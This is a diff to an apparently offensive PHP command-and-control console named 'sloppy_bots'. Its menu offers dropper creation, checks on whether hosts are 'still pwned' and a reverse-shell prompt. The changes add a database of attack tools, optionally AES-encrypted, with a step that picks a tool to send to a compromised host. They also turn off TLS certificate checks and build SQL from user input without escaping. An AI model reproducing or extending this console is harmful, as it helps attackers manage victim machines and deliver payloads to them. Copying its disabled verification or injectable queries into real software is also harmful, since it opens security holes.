@@ -10,12 +10,13 @@ $firstRun = new postgres_checker();
 $firstRun->createDB();
 $cof = array(
     "useragent" => "sp1.1",
-    "proxy" => "",
+    "proxy" => trim(readline("Proxy?(schema://host:port) Press enter for none->")),
     "host" => "127.0.0.1",
     "port" => "5432",
     "username" => get_current_user(),
-    "password" => "",
-    "dbname" => "sloppy_bots"
+    "password" => trim(readline("Password?Press enter for none->")),
+    "dbname" => "sloppy_bots",
+    "verify_ssl" => trim(readline("Verify SSL?(yes/no)->"))
 );
 //todo need to figure out why this is no longer working on raspi
 //$success = null;
@@ -45,6 +46,13 @@ try {
     } else {
         curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
         curl_setopt(CHH, CURLOPT_PROXY, config["proxy"]);
+    }
+    if (config['verify_ssl'] === "no"){
+        curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 0);
+    }else{
+        curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 1);
+        curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 1);
     }
 } catch (Exception $e) {
     print("{$e}\n\n");
@@ -116,12 +124,136 @@ function menu()
         (CR)eate Dropper                                                                  
         (U)pdates  -> not implemented yet.                                                                 
         (A)dd new host                                                              
-        (CH)eck if hosts are still pwned                                            
+        (CH)eck if hosts are still pwned
+        (AT) Add tool                                            
         (M)ain menu                                                                 
         (Q)uit                                                                      
 _MENU;
     echo "\n\n\033[0m\n";
 
+}
+
+function b64($what, $how, $whereWeGo){
+
+}
+
+
+function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
+{
+    $c = pg_connect(DBCONN);
+    if ($action === "add") {
+        if (!empty($pathToFile) && is_file($pathToFile) && !empty($toolName)) {
+            $file_parts = pathinfo($pathToFile);
+            switch ($file_parts['extension']){
+                case "sh":
+                    echo "Shell script detected.\n";
+                    $toolTarget = 'lin';
+                    $language = 'bash/shell scripting';
+                    break;
+                case "ps1":
+                    echo "Powershell script detected.\n";
+                    $toolTarget = 'win';
+                    $language = 'powershell';
+                    break;
+                case "py":
+                    echo "Python script detected.\n";
+                    $toolTarget = "universal";
+                    $language = "python";
+                    break;
+                case "php":
+                    echo "PHP script detected.\n";
+                    $toolTarget = "universal";
+                    $language = "php";
+                    break;
+                case "exe":
+                    echo "Binary file detected.\n";
+                    $toolTarget = 'win';
+                    $language = 'executable';
+                    break;
+                case "dll":
+                    echo "DLL(Dynamically linked library detected.\n";
+                    $toolTarget = 'win';
+                    $language = 'linked library';
+                    break;
+                case "so":
+                    echo "Shared Object detected.\n";
+                    $toolTarget = 'linux';
+                    $language = 'shared object guesing: c/c++';
+                    break;
+                case "lib":
+                    echo "Library detected.\n";
+                    $toolTarget = 'linux';
+                    $language = 'library object guessing: c/c++';
+                    break;
+                case "bat":
+                    echo "Batch script detected.\n";
+                    $toolTarget = 'win';
+                    $language = 'batch';
+                    break;
+                case "vbs":
+                    echo "Visual Basic script detected.\n";
+                    $toolTarget = 'win';
+                    $language = 'visual basic script';
+                    break;
+            }
+            if ($encrypted === true) {
+                $algo = "aes-256-gcm";
+                $passphrase = openssl_random_pseudo_bytes(32);
+                $passphraseHmacTagValue = openssl_random_pseudo_bytes(128);
+                $IV = openssl_random_pseudo_bytes((int)openssl_cipher_iv_length($algo));
+                $crypted = openssl_encrypt(file_get_contents($pathToFile), $algo, $passphrase, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $IV, $passphraseHmacTagValue, strlen($passphraseHmacTagValue));
+                $t = hash_hmac("sha512", $crypted, $binary = true);
+                if (empty($toolTarget)){
+                    $toolTarget = "unk";
+                    $language = "unk";
+                }
+                $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, encrypted) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
+                    $toolName,
+                    $toolTarget,
+                    base64_encode($crypted),
+                    base64_encode($passphrase),
+                    base64_encode($passphraseHmacTagValue),
+                    base64_encode($IV),
+                    base64_encode($algo),
+                    $t,
+                    $language,
+                    true
+                );
+            } else {
+                $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, hmac_hash) VALUES('%s', '%s', '%s', '%s', '%s')",
+                    $toolName,
+                    $toolTarget,
+                    base64_encode(file_get_contents($pathToFile)),
+                    $language,
+                    hash_hmac("sha512", base64_encode(file_get_contents($pathToFile)), $binary=true)
+                );
+            }
+            pg_exec($c, $SQL_STMT);
+        }
+    } elseif ($action === "grab") {
+        $tgrab = pg_exec($c, "SELECT * FROM sloppy_bots_tools");
+        echo str_repeat("+", 35) . "[ OUR TOOLSETS ]" . str_repeat("+", 39) . "\n\n";
+        foreach (pg_fetch_all($tgrab) as $ti => $tool){
+            if ($tool['encrypted'] == "t"){
+                $isEncrypted = "true";
+            }else{
+                $isEncrypted = "false";
+            }
+            print(sprintf("ID -> [ ". $tool['id'] ." ] Tool Name-> [ ". $tool['tool_name'] ." ] Target OS -> [ ". $tool['target']. " ] Lang -> [ " . $tool['lang']." ] Encrypted -> [ ". $isEncrypted." ]\n"));
+        }
+        echo "\n\n" . str_repeat("+", 35) . "[ END OUR TOOLSETS ]" . str_repeat("+", 35) . "\n\n";
+        $SQL_GRAB = sprintf("SELECT base64_encoded_tool,keys,tags,iv,cipher,hmac_hash,encrypted FROM sloppy_bots_tools WHERE id = '%s'", trim(readline('Which tool shall we use?(by ID)')));
+        try {
+            $selected_tool = pg_fetch_row(pg_exec($c, $SQL_GRAB));
+        }catch (Exception $toolE){
+            echo $toolE->getMessage()."\n";
+            echo $toolE->getTraceAsString()."\n";
+            echo $toolE->getLine()."\n";
+            return 0;
+        }
+        awesomeMenu();
+        b64($selected_tool, 'u', trim(readline("Which host shall we send this tool to?->")));
+    }
 }
 
 function opts()
@@ -156,6 +288,8 @@ function sys($host)
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 0);
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)) {
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
@@ -572,8 +706,8 @@ while ($run) {
         case "r":
             system(clears);
             awesomeMenu();
-            $h = readline("Please tell me the host.\n->");
-            $p = readline("\nWhich port shall we use?\n->");
+            $h = readline("Please tell me the host.(default is the host sending this request.)\n->");
+            $p = readline("\nWhich port shall we use?(default is 1634)\n->");
             $m = readline("Which method is to be used?(default is bash)\n->");
             if (!empty($h)) {
                 rev($h, $p, $m);
@@ -661,6 +795,22 @@ while ($run) {
             break;
         case "o":
             opts();
+            break;
+        case "at":
+            $add = trim(readline("Do we need to add it to the db? (add/grab) -> "));
+            if ($add === "add") {
+                $ourTool = trim(readline("Full path to tool-> "));
+                $dcrypt = trim(readline("Do we need to encrypt it?-> "));
+                if ($dcrypt === 'n') {
+                    $encrypt = false;
+                } else {
+                    $encrypt = true;
+                }
+                $name = trim(readline("Is there a name for it already, or what do you call it.? ->"));
+                sloppyTools($add, $ourTool, $name, $encrypt);
+            }else{
+                sloppyTools($add, '','','');
+            }
             break;
         default:
             logo($lc, clears, "", "", '');
